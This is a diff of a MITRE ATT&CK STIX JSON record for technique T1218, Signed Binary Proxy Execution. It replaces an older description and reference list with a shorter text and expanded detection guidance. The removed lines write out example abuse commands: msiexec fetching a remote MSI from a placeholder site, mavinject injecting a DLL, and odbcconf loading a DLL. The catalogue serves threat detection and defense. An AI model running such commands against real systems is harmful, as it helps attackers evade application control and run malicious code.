@@ -1,108 +1,63 @@
 {
     "type": "bundle",
-    "id": "bundle--9520a340-b473-46db-aa15-f069b8e4c588",
+    "id": "bundle--d78e92f8-3c89-4ed3-87c8-5753a4a64eb6",
     "spec_version": "2.0",
     "objects": [
         {
-            "x_mitre_data_sources": [
-                "Process monitoring",
-                "Process command-line parameters"
-            ],
-            "x_mitre_permissions_required": [
-                "User"
-            ],
-            "name": "Signed Binary Proxy Execution",
-            "description": "Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques.\n\n### Msiexec.exe\nMsiexec.exe is the command-line Windows utility for the Windows Installer. Adversaries may use msiexec.exe to launch malicious MSI files for code execution. An adversary may use it to launch local or network accessible MSI files.(Citation: LOLBAS Msiexec)(Citation: Rancor Unit42 June 2018)(Citation: TrendMicro Msiexec Feb 2018) Msiexec.exe may also be used to execute DLLs.(Citation: LOLBAS Msiexec)\n\n* <code>msiexec.exe /q /i \"C:\\path\\to\\file.msi\"</code>\n* <code>msiexec.exe /q /i http[:]//site[.]com/file.msi</code>\n* <code>msiexec.exe /y \"C:\\path\\to\\file.dll\"</code>\n\n### Mavinject.exe\nMavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process. (Citation: Twitter gN3mes1s Status Update MavInject32)\n\n* <code>\"C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\MavInject32.exe\" &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>\n* <code>C:\\Windows\\system32\\mavinject.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>\n\n### SyncAppvPublishingServer.exe\nSyncAppvPublishingServer.exe can be used to run PowerShell scripts without executing powershell.exe. (Citation: Twitter monoxgas Status Update SyncAppvPublishingServer)\n\n### Odbcconf.exe\nOdbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The utility can be misused to execute functionality equivalent to [Regsvr32](https://attack.mitre.org/techniques/T1117) with the REGSVR option to execute a DLL.(Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017)\n\n* <code>odbcconf.exe /S /A &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&rbrace;</code>\n\nSeveral other binaries exist that may be used to perform similar behavior. (Citation: GitHub Ultimate AppLocker Bypass List)",
-            "x_mitre_remote_support": false,
             "id": "attack-pattern--457c7820-d331-465a-915e-42f85500ccc4",
-            "modified": "2019-06-24T11:36:15.702Z",
-            "x_mitre_platforms": [
-                "Windows"
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "name": "Signed Binary Proxy Execution",
+            "description": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.",
+            "external_references": [
+                {
+                    "source_name": "mitre-attack",
+                    "external_id": "T1218",
+                    "url": "https://attack.mitre.org/techniques/T1218"
+                }
             ],
             "object_marking_refs": [
                 "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
             ],
-            "x_mitre_version": "2.0",
             "type": "attack-pattern",
-            "x_mitre_detection": "Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.",
-            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "defense-evasion"
+                }
+            ],
+            "modified": "2020-06-20T22:39:02.045Z",
+            "created": "2018-04-18T17:59:24.739Z",
+            "x_mitre_is_subtechnique": false,
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "x_mitre_permissions_required": [
+                "User",
+                "Administrator"
+            ],
+            "x_mitre_detection": "Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\n\nMonitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.",
+            "x_mitre_defense_bypassed": [
+                "Anti-virus",
+                "Application control",
+                "Digital Certificate Validation"
+            ],
             "x_mitre_contributors": [
                 "Nishan Maharjan, @loki248",
                 "Hans Christoffer Gaardl\u00f8s",
                 "Praetorian"
             ],
-            "created": "2018-04-18T17:59:24.739Z",
-            "kill_chain_phases": [
-                {
-                    "kill_chain_name": "mitre-attack",
-                    "phase_name": "defense-evasion"
-                },
-                {
-                    "kill_chain_name": "mitre-attack",
-                    "phase_name": "execution"
-                }
+            "x_mitre_data_sources": [
+                "API monitoring",
+                "File monitoring",
+                "Binary file metadata",
+                "Process use of network",
+                "Windows Registry",
+                "Loaded DLLs",
+                "DLL monitoring",
+                "Process monitoring",
+                "Process command-line parameters"
             ],
-            "external_references": [
-                {
-                    "external_id": "T1218",
-                    "source_name": "mitre-attack",
-                    "url": "https://attack.mitre.org/techniques/T1218"
-                },
-                {
-                    "description": "LOLBAS. (n.d.). Msiexec.exe. Retrieved April 18, 2019.",
-                    "source_name": "LOLBAS Msiexec",
-                    "url": "https://lolbas-project.github.io/lolbas/Binaries/Msiexec/"
-                },
-                {
-                    "source_name": "Rancor Unit42 June 2018",
-                    "description": "Ash, B., et al. (2018, June 26). RANCOR: Targeted Attacks in South East Asia Using PLAINTEE and DDKONG Malware Families. Retrieved July 2, 2018.",
-                    "url": "https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/"
-                },
-                {
-                    "description": "Co, M. and Sison, G. (2018, February 8). Attack Using Windows Installer msiexec.exe leads to LokiBot. Retrieved April 18, 2019.",
-                    "source_name": "TrendMicro Msiexec Feb 2018",
-                    "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/"
-                },
-                {
-                    "description": "Giuseppe. (2017, December 14). gN3mes1s Status Update. Retrieved April 10, 2018.",
-                    "source_name": "Twitter gN3mes1s Status Update MavInject32",
-                    "url": "https://twitter.com/gn3mes1s/status/941315826107510784"
-                },
-                {
-                    "source_name": "Twitter monoxgas Status Update SyncAppvPublishingServer",
-                    "description": "Landers, N. (2017, August 8). monoxgas Status Update. Retrieved April 10, 2018.",
-                    "url": "https://twitter.com/monoxgas/status/895045566090010624"
-                },
-                {
-                    "source_name": "Microsoft odbcconf.exe",
-                    "description": "Microsoft. (2017, January 18). ODBCCONF.EXE. Retrieved March 7, 2019.",
-                    "url": "https://docs.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-2017"
-                },
-                {
-                    "description": "LOLBAS. (n.d.). Odbcconf.exe. Retrieved March 7, 2019.",
-                    "source_name": "LOLBAS Odbcconf",
-                    "url": "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/"
-                },
-                {
-                    "description": "Bermejo, L., Giagone, R., Wu, R., and Yarochkin, F. (2017, August 7). Backdoor-carrying Emails Set Sights on Russian-speaking Businesses. Retrieved March 7, 2019.",
-                    "source_name": "TrendMicro Squiblydoo Aug 2017",
-                    "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses/"
-                },
-                {
-                    "description": "Giagone, R., Bermejo, L., and Yarochkin, F. (2017, November 20). Cobalt Strikes Again: Spam Runs Use Macros and CVE-2017-8759 Exploit Against Russian Banks. Retrieved March 7, 2019.",
-                    "source_name": "TrendMicro Cobalt Group Nov 2017",
-                    "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/cobalt-spam-runs-use-macros-cve-2017-8759-exploit/"
-                },
-                {
-                    "description": "Moe, O. (2018, March 1). Ultimate AppLocker Bypass List. Retrieved April 10, 2018.",
-                    "source_name": "GitHub Ultimate AppLocker Bypass List",
-                    "url": "https://github.com/api0cradle/UltimateAppLockerByPassList"
-                }
-            ],
-            "x_mitre_defense_bypassed": [
-                "Application whitelisting",
-                "Digital Certificate Validation"
-            ]
+            "x_mitre_version": "2.1"
         }
     ]
 }
